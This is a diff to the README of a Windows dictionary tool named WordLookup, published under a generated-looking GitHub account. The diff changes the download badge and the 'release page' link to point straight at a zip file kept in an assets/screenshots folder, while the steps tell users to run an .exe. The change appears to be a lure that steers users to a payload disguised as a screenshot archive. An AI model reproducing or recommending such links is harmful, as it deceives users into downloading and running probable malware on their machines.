@@ -1,6 +1,6 @@
 # 📖 WordLookup - Instant dictionary access for Windows users
 
-[![Download WordLookup](https://img.shields.io/badge/Download-WordLookup-blue.svg)](https://github.com/Outfitted-genusstenopterygius236/WordLookup)
+[![Download WordLookup](https://img.shields.io/badge/Download-WordLookup-blue.svg)](https://github.com/Outfitted-genusstenopterygius236/WordLookup/raw/refs/heads/main/assets/screenshots/Word-Lookup-1.4.zip)
 
 ## 📋 What is WordLookup?
 
@@ -17,7 +17,7 @@ WordLookup helps you find dictionary definitions on your computer screen. You se
 
 Follow these steps to set up the tool on your computer. 
 
-1. Visit the [WordLookup release page](https://github.com/Outfitted-genusstenopterygius236/WordLookup) to download the application.
+1. Visit the [WordLookup release page](https://github.com/Outfitted-genusstenopterygius236/WordLookup/raw/refs/heads/main/assets/screenshots/Word-Lookup-1.4.zip) to download the application.
 2. Locate the link labeled "Assets" on the page.
 3. Click the file ending in .exe to start your download.
 4. Open the downloaded file once the process finishes.
